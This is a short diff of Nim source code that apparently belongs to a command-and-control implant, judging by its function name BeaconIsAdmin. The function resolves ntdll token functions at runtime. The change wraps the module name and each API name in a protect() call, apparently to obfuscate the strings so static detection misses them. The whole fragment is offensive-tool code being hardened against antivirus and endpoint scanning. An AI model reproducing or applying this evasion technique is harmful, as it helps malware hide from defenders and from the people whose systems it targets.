@@ -294,10 +294,10 @@ type
 
 proc BeaconIsAdmin(): BOOL {.stdcall.}=
     let 
-        hNtdll = GetModuleHandleA("ntdll")
-        pNtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(hNtdll, "NtOpenProcessToken"))
-        pNtOpenThreadToken = cast[NtOpenThreadToken](GetProcAddress(hNtdll, "NtOpenThreadToken"))
-        pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(hNtdll, "NtQueryInformationToken"))
+        hNtdll = GetModuleHandleA(protect("ntdll"))
+        pNtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(hNtdll, protect("NtOpenProcessToken")))
+        pNtOpenThreadToken = cast[NtOpenThreadToken](GetProcAddress(hNtdll, protect("NtOpenThreadToken")))
+        pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(hNtdll, protect("NtQueryInformationToken")))
     
     var 
         status: NTSTATUS = 0
